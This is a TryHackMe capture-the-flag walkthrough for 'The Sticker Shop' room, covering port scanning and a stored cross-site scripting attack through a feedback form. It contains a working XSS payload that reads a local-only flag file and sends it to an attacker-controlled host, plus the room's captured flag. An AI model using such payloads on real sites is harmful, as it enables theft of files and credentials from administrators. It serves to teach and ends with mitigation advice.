# TryHackMe - The Sticker Shop -walkthrough

This is a challenge room from TRYHACKME - It walk us through a realistic scenario that highlights real world impacts of client-side vulnerability, specifically Stored Cross Site Scripting(Stored XSS)

Description:

```coffeescript
Your local sticker shop has finally developed its own webpage. They do not have too much experience regarding web development, so they decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback. Smart move!
```

Can you read the flag at `http://10.10.151.152:8080/flag.txt`?

**Goal**:

```coffeescript
 Find a way to read the contents of /flag.txt — a file that is restricted to local access.
```

### Recon & Enumeration

I used RustScan and Nmap to figure out which ports are open and what services are running in the machine

```coffeescript
rustscan -r 1-65535 -a 10.10.151.152 -- -sV -sC -T4 -oN scan_results
```

![image.png](TryHackMe%20-%20The%20Sticker%20Shop%20-walkthrough/image.png)

From the nmap results I saw the web service running on port 8080,  I navigated to the site and found a webpage for cat sticker shop, 

Exploring the site further, I found a feedback section where users input their feedback and which is sent to the server in POST request. It looks a potential entry point for client side attacks

![image.png](TryHackMe%20-%20The%20Sticker%20Shop%20-walkthrough/image%201.png)

I tried to access the flag directly from the browser, but it throws 403 (expected obviously). This tells us the file is restricted to local users only, such as the browser used by local users/admins

## Exploitation - Stored XSS vulnerability

I navigated back to the feedback page to test for Client Side Attacks.

Since the feedback is reviewed by some local user/admin or owner which is using the same computer to host the site, if I can submit a Cross Site Scripting(stored one)  payload on the feedback input box, I can execute the javascript on the reviewers browser which allows me to send the flag to a server I control

I used the following malicious JS code

```coffeescript
'"><script>
   fetch('http://127.0.0.1:8080/flag.txt')
        .then(response => response.text())
        .then(data => {
            fetch('http://my-ip/?flag=' + encodeURIComponent(data))
        })
</script>
```

Explanation of the payload, what each piece does:

- `'" ><script>` — closes whatever attribute/HTML context precedes it and opens a script tag.
- `fetch('http://127.0.0.1:8080/flag.txt')` — issues an HTTP GET to the local loopback service on port 8080 asking for `flag.txt`.
- `.then(response => response.text())` — converts the response body to plain text.
- `.then(data => { fetch('http://10.21.89.255/?flag=' + encodeURIComponent(data)) })` — sends the retrieved text to an attacker-controlled server by issuing another HTTP request with the data in the query string. `encodeURIComponent` URL-escapes the payload to keep it valid in a URL.

After submitting the payload and waiting a few moments, my python server received get request containing the room’s Flag(url encoded) in the flag param we sent.

![image.png](TryHackMe%20-%20The%20Sticker%20Shop%20-walkthrough/image%202.png)

BOOM!!!   - There we go

Here is the decoded flag ⇒ THM{83789a69074f636f64a38879cfcabe8b62305ee6} 

I recommend doing all the steps by yourself and decode the flag using tons of tools out there, I was using **Caido** in my case

🔐 **Lesson learned**:

- XSS runs attacker JS in a victim’s browser.
- It can reach internal endpoints the attacker cannot.
- It can steal files, tokens, and perform actions as the user.

If your are web dev or owner, it is recommended to 

- Escape/encode all user output by context.
- Sanitize any allowed HTML (e.g., DOMPurify).
- Enforce strict CSP and HttpOnly/Secure/SameSite cookies.